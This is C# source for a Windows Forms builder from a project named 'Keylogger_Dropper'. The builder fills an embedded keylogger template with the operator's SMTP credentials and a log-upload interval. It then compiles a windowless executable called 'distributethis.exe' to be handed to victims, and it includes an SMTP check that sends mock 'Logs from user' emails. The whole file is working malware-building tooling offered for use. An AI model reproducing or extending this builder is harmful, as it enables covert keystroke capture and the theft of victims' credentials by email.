using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Net.Mail;

namespace Project_Serenity
{
    public partial class Form1 : Form
    {
        public class Toolkit
        {
            public static void BuildExecutable(string source, string output, bool hideWindow)
            {
                var targetFramework = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
                CSharpCodeProvider codeProvider = new CSharpCodeProvider(targetFramework);
                ICodeCompiler icc = codeProvider.CreateCompiler();

                CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;

                parameters.OutputAssembly = output;
                parameters.GenerateExecutable = true;
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                parameters.GenerateInMemory = false;
                parameters.WarningLevel = 0;
                parameters.TreatWarningsAsErrors = false;

                if (hideWindow == true)
                {
                    parameters.CompilerOptions = "/filealign:0x00000200 /platform:anycpu /optimize+ /target:winexe";
                }
                else
                {
                    parameters.CompilerOptions = "/filealign:0x00000200 /platform:anycpu /optimize+";
                }

                CompilerResults results = icc.CompileAssemblyFromSource(parameters, source);

                if (results.Errors.Count > 0)
                {
                    int i = 1;
                    foreach (CompilerError CompErr in results.Errors)
                    {
                        
                        MessageBox.Show(String.Format("Error Message: {0}\n\nError Line: {1}\n\nError line is at line number {2} in the template file.", CompErr.ErrorText, Toolkit.ReadSourceByLineNumber(Keylogger_Dropper.Properties.Resources.source, CompErr.Line), CompErr.Line.ToString()).Trim(), String.Format("Build Error Encountered ({0} of {1})", i, results.Errors.Count.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Error);
                        i = i + 1;
                    }
                }
                else
                {
                    if (hideWindow == true)
                    {
                        MessageBox.Show("Compiled successfully!\n\nFile 'distributethis.exe' has been generated in the same directory as the builder.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    } else
                    {
                        MessageBox.Show("Compiled successfully!\n\nFile 'distributethisDEBUG.exe' has been generated in the same directory as the builder.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    
                }
            }
            private static string ReadSourceByLineNumber(string text, int lineNumber)
            {
                var reader = new StringReader(text);

                string line;
                int currentLineNumber = 0;

                do
                {
                    currentLineNumber += 1;
                    line = reader.ReadLine();
                }
                while (line != null && currentLineNumber < lineNumber);

                return (currentLineNumber == lineNumber) ? line : string.Empty;
            }
            public static void TestSmtp(string recipient, string username, string pass, string smtpHost, int port)
            {
                recipient = username;
                // Command line argument must the the SMTP host.
                SmtpClient client = new SmtpClient();
                client.Port = port;
                client.Host = smtpHost;
                client.EnableSsl = true;
                client.Timeout = 10000;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new System.Net.NetworkCredential(username, pass);

                MailMessage mm = new MailMessage("donotreply@domain.com", recipient, String.Format("Logs from user {0} ({1})", "getcomputerusername", DateTime.Now.ToString()), "SMTP Check = Passed!");
                mm.BodyEncoding = UTF8Encoding.UTF8;
                mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;


                try
                {
                    client.Send(mm);
                } catch (Exception e)
                {
                    MessageBox.Show(String.Format("Exception encountered testing SMTP Server!\n\nMessage: '{0}'", e.Message.ToString()), "SMTP Testing Module", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                MessageBox.Show("SMTP Settings are correct!\n\nYou may use these settings!", "SMTP Check passed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            string tempSource = Keylogger_Dropper.Properties.Resources.source;

            #region SetUploadLog interval 
            int interval;
            int.TryParse(textBox5.Text,out interval);

            tempSource = tempSource.Replace("aTimer.Interval = 10000;", String.Format("aTimer.Interval = {0};", interval));
            #endregion

            #region delivery method check
            if (radioButton3.Checked == true)
            {
                tempSource = tempSource.Replace("%USERNAME%", textBox1.Text);
                tempSource = tempSource.Replace("%PASSWORD%", textBox2.Text);
                tempSource = tempSource.Replace("%HOSTSMTP%", textBox3.Text);
                tempSource = tempSource.Replace("%SMTPPORT%", textBox4.Text);
            } else
            {

            }

            #endregion

            #region Debugging/Final Check (HAS TO BE FINAL CHECK) + final build sequence
            if (radioButton1.Checked == true)
            {
                // keep debugging mode enabled
                //tempSource = tempSource.Replace("public static bool debugMode { get; set; } = true;", "");
                Toolkit.BuildExecutable(tempSource, "distributethisDEBUG.exe", false);
                return;
            }
            else if (radioButton2.Checked == true)
            {
                // disable debugging mode
                tempSource = tempSource.Replace("public static bool debugMode = true;", "public static bool debugMode = false;");
                Toolkit.BuildExecutable(tempSource, "distributethis.exe", true);
                return;
            }
            #endregion
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Toolkit.TestSmtp(textBox1.Text, textBox1.Text, textBox2.Text, textBox3.Text, Convert.ToInt32(textBox4.Text));
        }
    }
}
